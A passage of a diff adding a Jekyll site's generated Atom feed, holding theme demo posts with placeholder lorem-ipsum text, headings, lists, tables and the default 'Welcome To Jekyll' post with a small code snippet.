+&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt.&lt;/p&gt;
+
+&lt;h3 id=&quot;some-great-subheading-h3-2&quot;&gt;Some great subheading (h3)&lt;/h3&gt;
+
+&lt;p&gt;Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum.&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Hello, World!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+
+&lt;h4 id=&quot;you-might-want-a-sub-subheading-h4&quot;&gt;You might want a sub-subheading (h4)&lt;/h4&gt;
+
+&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+
+&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+
+&lt;h4 id=&quot;but-its-probably-overkill-h4&quot;&gt;But it’s probably overkill (h4)&lt;/h4&gt;
+
+&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+
+&lt;h3 id=&quot;oh-hai-an-unordered-list&quot;&gt;Oh hai, an unordered list!!&lt;/h3&gt;
+
+&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;First item, yo&lt;/li&gt;
+  &lt;li&gt;Second item, dawg&lt;/li&gt;
+  &lt;li&gt;Third item, what what?!&lt;/li&gt;
+  &lt;li&gt;Fourth item, fo sheezy my neezy&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;oh-hai-an-ordered-list&quot;&gt;Oh hai, an ordered list!!&lt;/h3&gt;
+
+&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;First item, yo&lt;/li&gt;
+  &lt;li&gt;Second item, dawg&lt;/li&gt;
+  &lt;li&gt;Third item, what what?!&lt;/li&gt;
+  &lt;li&gt;Fourth item, fo sheezy my neezy&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;headings-are-cool-h2&quot;&gt;Headings are cool! (h2)&lt;/h2&gt;
+
+&lt;p&gt;Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
+
+&lt;p&gt;Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
+
+&lt;p&gt;Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc.&lt;/p&gt;
+
+&lt;h3 id=&quot;tables&quot;&gt;Tables&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Title 1&lt;/th&gt;
+      &lt;th&gt;Title 2&lt;/th&gt;
+      &lt;th&gt;Title 3&lt;/th&gt;
+      &lt;th&gt;Title 4&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lorem&lt;/td&gt;
+      &lt;td&gt;lorem ipsum&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Title 1&lt;/th&gt;
+      &lt;th&gt;Title 2&lt;/th&gt;
+      &lt;th&gt;Title 3&lt;/th&gt;
+      &lt;th&gt;Title 4&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lorem&lt;/td&gt;
+      &lt;td&gt;lorem ipsum&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lorem ipsum dolor sit amet&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit amet consectetur&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit amet&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lorem ipsum dolor&lt;/td&gt;
+      &lt;td&gt;lorem ipsum&lt;/td&gt;
+      &lt;td&gt;lorem&lt;/td&gt;
+      &lt;td&gt;lorem ipsum&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lorem ipsum dolor&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit amet&lt;/td&gt;
+      &lt;td&gt;lorem ipsum dolor sit amet consectetur&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;</content><author><name>Bart Simpson</name></author><summary type="html">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit.</summary></entry><entry><title type="html">Welcome To Jekyll</title><link href="http://localhost:4000/2016/05/20/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome To Jekyll" /><published>2016-05-20T00:00:00+03:00</published><updated>2016-05-20T00:00:00+03:00</updated><id>http://localhost:4000/2016/05/20/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/2016/05/20/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hi, #{name}&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">Some articles are just so short that we have to make the footer stick</title><link href="http://localhost:4000/misc/2016/05/19/super-short-article.html" rel="alternate" type="text/html" title="Some articles are just so short that we have to make the footer stick" /><published>2016-05-19T00:00:00+03:00</published><updated>2016-05-19T00:00:00+03:00</updated><id>http://localhost:4000/misc/2016/05/19/super-short-article</id><content type="html" xml:base="http://localhost:4000/misc/2016/05/19/super-short-article.html">&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;</content><author><name></name></author><summary type="html">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</summary></entry></feed>
